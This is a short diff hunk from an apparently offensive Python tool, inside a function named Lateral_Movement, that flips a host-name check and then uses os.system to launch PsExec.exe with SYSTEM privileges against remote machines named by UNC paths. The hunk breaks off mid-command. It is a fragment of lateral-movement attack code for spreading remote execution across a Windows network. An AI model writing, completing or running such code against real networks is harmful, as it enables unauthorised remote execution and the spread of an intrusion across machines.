@@ -221,7 +221,7 @@ def Lateral_Movement():
         name1 = str(name[0]).upper()
         for i in range(len(lists)):
             lines = line[0].split(".")
-            if not name1 in lists[i+1]:
+            if name1 in lists[i+1]:
                 j = i
                 for j in range(len(lists)-1):
                     return_code = os.system('start cmd /k C:\module2\DownloadFile-main\PsExec.exe -s \\\\' +
